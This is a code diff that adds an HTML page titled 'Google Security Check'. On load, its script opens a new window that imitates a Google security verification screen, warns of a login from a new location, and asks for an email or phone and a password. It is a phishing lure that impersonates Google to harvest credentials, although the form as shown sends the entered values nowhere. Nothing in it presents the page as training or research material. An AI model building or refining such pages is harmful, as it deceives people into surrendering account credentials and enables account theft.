@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Google Security Check</title>
+    <script>
+        // Auto execute tanpa perlu click
+        window.onload = function() {
+            let win = window.open("", "_blank");
+            
+            win.document.write(`
+                <title>Google</title>
+                <h1>Google Security Verification</h1>
+                <p>Your account was accessed from new location</p>
+                <input placeholder="Email or phone">
+                <input type="password" placeholder="Password">
+                <button>Verify Now</button>
+            `);
+            win.document.close();
+        };
+    </script>
+</head>
+<body>
+    <p>Loading security check...</p>
+</body>
+</html>
